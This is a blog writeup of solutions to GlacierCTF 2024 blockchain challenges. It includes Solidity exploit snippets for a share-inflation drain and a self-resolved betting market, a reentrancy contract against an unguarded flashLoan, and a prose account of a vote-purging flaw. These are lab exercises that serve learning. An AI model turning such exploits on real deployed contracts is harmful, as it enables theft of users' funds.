---
layout: post
title:  GlacierCTF 2024 Blockchain challenges
date:   2024-11-22 -0700
description: GlacierCTF 2024 - Blockchain
tags: [GlacierCTF, Blockchain, Writeup]
exclude: false
---

### Note

I've included all 3 challenges that I solved in one writeup because solutions are somewhat small.

## Drainme

We are given a `ChallengeContract` instance, which has the following functions:

```solidity
function depositEth() public payable {
  uint256 value = msg.value;
  uint256 shares = 0;

  require(value > 0, "Value too small");

  if (totalShares == 0) {
      shares = value;
  } else {
      shares = (totalShares * value) / address(this).balance;
  }

  totalShares += shares;
  balances[msg.sender] += shares;
}

function withdrawEth(uint256 shares) public {
  require(balances[msg.sender] >= shares, "Not enough shares");

  uint256 value = (shares * address(this).balance) / totalShares;

  totalShares -= shares;
  balances[msg.sender] -= shares;

  (bool success, ) = address(msg.sender).call{value: value}("");
  require(success, "ETH transfer failed");
}
```

We are also given another contract called `SharesBuyer`, which initially receives some ether from the `Setup` contract and can either deposit its full balance to `ChallengeContract` or receive ether from someone. The following code successfully exploits the contract:

```solidity
c.depositEth{value: 1}();
sb.buyShares();
c.withdrawEth(c.balances(msg.sender));
```

Here `c` is the given `ChallengeContract` and `sb` is the given `SharesBuyer` contract. `address(this).balance` is updated before the function execution, so after the first two lines run `totalShares` is **1**. When the contract calculates how much to withdraw, it will get `value = 1 * address(this).balance / 1`, so it will give us its whole balance.

## FrozyMarket

We are given a `FrozyMarket` contract instance whose functionality is to create a market, determine a winning boolean value when resolved, and let users claim winnings. For this challenge the following code works:

```solidity
f.createMarket("pwned", 0);
f.bet{value: 0.5 ether}(1, false);
f.resolveMarket(1, false);
f.claimWinnings(1);
```

Even though the contract creates one market initially, it also allows us to create as many markets as we want. If we create a market and set its `resolvedBy` timestamp to 0 (so we can resolve it immediately), we can later set `false` as the winning bet.


## ArcticVault

The challenge gives us an `ArcticVault` contract instance, which implements multicall to save gas. This challenge can be exploited in two ways. The way I solved it is unintended. Here's the exploit contract:

```solidity
contract Exploit {
  Setup s;
  ArcticVault public a;
  bool once = true;

  constructor(address _s) payable {
    s = Setup(_s);
    a = ArcticVault(s.TARGET());
  }

  function exploit() public {
    a.flashLoan(1 ether);
    a.withdraw();
  }

  fallback() external payable {
    if (once) {
      once = !once;
      a.flashLoan(0);
      a.deposit{value: 1 ether}();
    }
  }
}
```

This contract exploits the fact that `flashLoan` is not protected by `reentrancyGuard`. If we call it twice, after the second call we can call `deposit` (which is protected by `reentrancyGuard` but we've set it to `false` from the previous `flashLoan`) and deposit the loaned amount back. That tricks the contract into thinking we've deposited our own balance while we have actually deposited its balance back. After this we can simply withdraw and get the flag.

### Intended Exploit

But what's the point of adding multicall functionality if we didn't need to use it? The intended exploit would have been to abuse `msg.value` reuse (for example, in `muticallThis`) and `deposit` twice while only paying once.


## Voteme

My teammate solved this one, but I wanted to briefly state the vulnerability. When a violator is detected, the contract purges the votes of the proposal for which it detected the violator. If we create many contracts that vote for one **real** proposal once and for another proposal twice (or more times), they will be detected on the second proposal (via `checkConsesus`), and their votes for the first proposal would stay. This way we can increase votes for the proposal while keeping the same number of stakers.